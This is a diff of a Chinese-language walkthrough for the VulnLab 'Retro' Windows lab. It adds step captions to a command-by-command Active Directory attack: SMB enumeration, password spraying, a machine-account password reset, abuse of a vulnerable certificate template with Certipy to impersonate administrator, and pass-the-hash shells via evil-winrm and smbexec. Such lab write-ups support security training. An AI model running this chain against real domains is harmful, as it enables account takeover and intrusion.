@@ -4,15 +4,18 @@ date: 2024-05-03
 tags: ["vulnlab", "windows"]
 draft: false
 categories: walkthrough
+featured_image: "https://assets.vulnlab.com/retro_slide.png"
+
 ---
 
 ![](https://assets.vulnlab.com/retro_slide.png)
 
+从Discord拿到IP  10.10.120.215
+
+网络扫描
 
 
-
-
-```
+```bash
 $ export rip=10.10.120.215
 $ sudo nmap -v -A -Pn -p- $rip
 PORT      STATE SERVICE       VERSION
@@ -108,8 +111,9 @@ PORT      STATE SERVICE       VERSION
 ```
 
 
+探测smb信息
 
-```
+```bash
 $ crackmapexec smb 10.10.120.215 
 SMB         10.10.120.215   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
 $ smbclient -L //10.10.120.215
@@ -119,7 +123,7 @@ $ smbclient -L //10.10.120.215
 
 发现目录Trainees和Notes
 
-```
+```bash
 $ /home/kali/.local/share/pipx/venvs/netexec/bin/lookupsid.py anonymous@10.10.120.215 -no-pass
 
 [*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
@@ -158,7 +162,7 @@ $ /home/kali/.local/share/pipx/venvs/netexec/bin/lookupsid.py anonymous@10.10.12
 
 尝试匿名访问
 
-```
+```bash
 smb://10.10.120.215/trainees/
 ```
 
@@ -166,7 +170,7 @@ smb://10.10.120.215/trainees/
 
 
 
-```
+```bash
 $ cat users.txt             
 trainee
 BANKING$
@@ -179,35 +183,40 @@ $ kerbrute userenum --dc 10.10.120.215 -d retro.vl users.txt -v
 
 
 
-```
+```bash
 $ crackmapexec smb 10.10.120.215 -u users.txt -p users.txt --continue-on-success
 ```
 
 ![](https://static.guyu.pro/vulnlab/Retro/4.webp)
 
+发现banking$用户密码是banking
 
+查看notes目录，使用trainee用户，密码trainee
 
-```
+```bash
 $ crackmapexec smb 10.10.120.215 -u 'trainee' -p 'trainee' --shares 
 ```
 
 ![](https://static.guyu.pro/vulnlab/Retro/5.webp)
 
-```
+使用`smbpasswd`尝试修改banking$用户密码失败
+
+```bash
 $ smbpasswd -r 10.10.120.215 -U banking$
 ```
 
 ![](https://static.guyu.pro/vulnlab/Retro/6.webp)
 
 
+使用`kpasswd`尝试修改banking$用户密码成功
 
-```
+```bash
 $ cat /etc/krb5.conf
 ```
 
 ![](https://static.guyu.pro/vulnlab/Retro/7.webp)
 
-```
+```bash
 $ sudo vim /etc/hosts
 10.10.120.215   dc.retro.vl
 10.10.120.215   retro.vl
@@ -217,7 +226,7 @@ $ sudo vim /etc/hosts
 
 ![](https://static.guyu.pro/vulnlab/Retro/8.webp)
 
-```
+```bash
 kpasswd BANKING$
 banking
 P@ss1234
@@ -226,8 +235,9 @@ P@ss1234
 ![](https://static.guyu.pro/vulnlab/Retro/9.webp)
 
 
+使用`certipy-ad` 探测
 
-```
+```bash
 $ certipy-ad find -u 'BANKING$' -p 'P@ss1234' -dc-ip 10.10.120.215 -stdout -vulnerable
 Certipy v4.7.0 - by Oliver Lyak (ly4k)
 
@@ -304,25 +314,33 @@ Certificate Templates
 
 ![](https://static.guyu.pro/vulnlab/Retro/10.webp)
 
-```
+申请证书
+
+```bash
 $ certipy-ad req -u 'BANKING$'@retro.vl -p 'P@ss1234' -c 'retro-DC-CA' -target 'dc.retro.vl' -template 'RetroClients' -upn 'administrator' -key-size 4096
 ```
 
 ![](https://static.guyu.pro/vulnlab/Retro/11.webp)
 
-```
+获得hash
+
+```bash
 $ certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' -dc-ip 10.10.120.215 
 ```
 
 ![](https://static.guyu.pro/vulnlab/Retro/12.webp)
 
-```
+使用`evil-winrm`
+
+```bash
 $ evil-winrm -i 10.10.120.215 -u 'administrator' -H "252fac7066d93dd009d4fd2cd0368389"
 ```
 
 ![](https://static.guyu.pro/vulnlab/Retro/13.webp)
 
-```
+使用`smbexec.py`
+
+```bash
 $ /home/kali/.local/share/pipx/venvs/netexec/bin/smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389 retro.vl/administrator@10.10.120.215
 
 ```
